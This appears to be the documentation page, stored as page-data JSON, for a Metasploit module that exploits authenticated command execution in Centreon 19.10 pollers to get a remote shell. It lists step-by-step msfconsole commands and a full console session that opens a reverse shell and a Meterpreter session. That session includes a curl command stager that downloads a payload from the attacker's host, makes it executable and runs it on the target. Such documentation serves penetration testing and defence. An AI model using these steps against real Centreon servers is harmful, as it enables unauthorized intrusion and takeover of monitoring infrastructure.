{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/centreon_pollers_auth_rce","result":{"data":{"moduleMetadataJson":{"id":"5c648fee-5cb5-56ea-b979-c6c17337dbdb","name":"Centreon Poller Authenticated Remote Command Execution","fullname":"exploit/linux/http/centreon_pollers_auth_rce","description":"An authenticated user with sufficient administrative rights to manage pollers can use this functionality to\n        execute arbitrary commands remotely. Usually, the miscellaneous commands are used by the additional modules\n        (to perform certain actions), by the scheduler for data processing, etc.\n\n        This module uses this functionality to obtain a remote shell on the target.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/centreon_pollers_auth_rce","documentationSlug":"/modules/documentation/exploit/linux/http/centreon_pollers_auth_rce","referencesSlug":"/modules/references/exploit/linux/http/centreon_pollers_auth_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Centreon is an open source IT monitoring solution by Centreon, a leading Paris-based software company.</p>\n<p>An authenticated user with sufficient administrative rights to manage pollers can use this functionality to\nexecute arbitrary commands remotely. Usually, the miscellaneous commands are used by the additional modules\n(to perform certain actions), by the scheduler for data processing, etc.</p>\n<p>This module uses this functionality to obtain a remote shell on the target.</p>\n<p>Tested on:</p>\n<ul>\n<li><a href=\"http://vm.download.centreon.com/centreon-vbox-vm-19_10-3.el7.ovf.zip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Centreon 19.10.8</a></li>\n<li><a href=\"http://vm.download.centreon.com/centreon-vbox-vm-19_10-1.el7.ovf.zip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Centreon 19.10.5</a></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the module as usual</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/http/centreon_pollers_auth_rce</code></li>\n<li>Do: <code class=\"language-text\">set RHOSTS [IP]</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">set USERNAME [USERNAME]</code></li>\n<li>Do: <code class=\"language-text\">sat PASSWORD [PASSWORD]</code></li>\n<li>Do: <code class=\"language-text\">set VERBOSE true</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/http/centreon_pollers_auth_rce\nmsf5 exploit(linux/http/centreon_pollers_auth_rce) &gt; set rhosts [IP]\nrhosts =&gt; [IP]\nmsf5 exploit(linux/http/centreon_pollers_auth_rce) &gt; set username admin\nusername =&gt; admin\nmsf5 exploit(linux/http/centreon_pollers_auth_rce) &gt; set password centreon\npassword =&gt; centreon\nmsf5 exploit(linux/http/centreon_pollers_auth_rce) &gt; set lhost [IP]\nlhost =&gt; [IP]\nmsf5 exploit(linux/http/centreon_pollers_auth_rce) &gt; set verbose true\nverbose =&gt; true\nmsf5 exploit(linux/http/centreon_pollers_auth_rce) &gt; run\n\n[*] Started reverse TCP handler on XXX.XXX.XXX.XXX:4444\n[*] Send authentication request.\n[*] Successful authenticated.\n[*] Upload command payload on the target.\n[*] Create new poller entry on the target.\n[*] Reload the poller to trigger exploitation.\n[*]  -- Generating files.\n[*]  -- Restarting engine.\n[*]  -- Executing command.\n[*] Command shell session 1 opened (XXX.XXX.XXX.XXX:4444 -&gt; XXX.XXX.XXX.XXX:59624) at 2020-02-03 17:41:13 +0400\n\nid\nuid=48(apache) gid=48(apache) groups=48(apache),993(centreon-engine),994(centreon-broker),998(centreon),999(nagios)\n\n  --or--\n\nmsf5 exploit(linux/http/centreon_pollers_auth_rce) &gt; set target 1\ntarget =&gt; 1\nmsf5 exploit(linux/http/centreon_pollers_auth_rce) &gt; run\n\n[*] Started reverse TCP handler on XXX.XXX.XXX.XXX:4444\n[*] Send authentication request.\n[*] Successful authenticated.\n[*] Using URL: http://0.0.0.0:8080/fNqJS82wB\n[*] Local IP: http://XXX.XXX.XXX.XXX:8080/fNqJS82wB\n[*] Generated command stager: [&quot;curl -so /tmp/MBoYQsJv http://XXX.XXX.XXX.XXX:8080/fNqJS82wB;chmod +x /tmp/MBoYQsJv;/tmp/MBoYQsJv;rm -f /tmp/MBoYQsJv&quot;]\n[*] Upload command payload on the target.\n[*] Create new poller entry on the target.\n[*] Reload the poller to trigger exploitation.\n[*]  -- Generating files.\n[*]  -- Restarting engine.\n[*]  -- Executing command.\n[*] Client XXX.XXX.XXX.XXX (curl/7.29.0) requested /fNqJS82wB\n[*] Sending payload to XXX.XXX.XXX.XXX (curl/7.29.0)\n[*] Transmitting intermediate stager...(126 bytes)\n[*] Sending stage (3021284 bytes) to XXX.XXX.XXX.XXX\n[*] Meterpreter session 2 opened (XXX.XXX.XXX.XXX:4444 -&gt; XXX.XXX.XXX.XXX:60536) at 2020-02-03 17:44:47 +0400\n[*] Server stopped.\n\nmeterpreter &gt; getuid\nServer username: uid=48, gid=48, euid=48, egid=48\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Id  Name\n--  ----\n0   Reverse shell (In-Memory)\n1   Meterpreter (Dropper)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"references\" style=\"position:relative;\"><a href=\"#references\" aria-label=\"references permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>References</h2>\n<ol>\n<li><a href=\"https://www.exploit-db.com/exploits/47969\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.exploit-db.com/exploits/47969</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/47977\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.exploit-db.com/exploits/47977</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/47978\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.exploit-db.com/exploits/47978</a></li>\n</ol>"}}},"pageContext":{"id":"5c648fee-5cb5-56ea-b979-c6c17337dbdb"}}}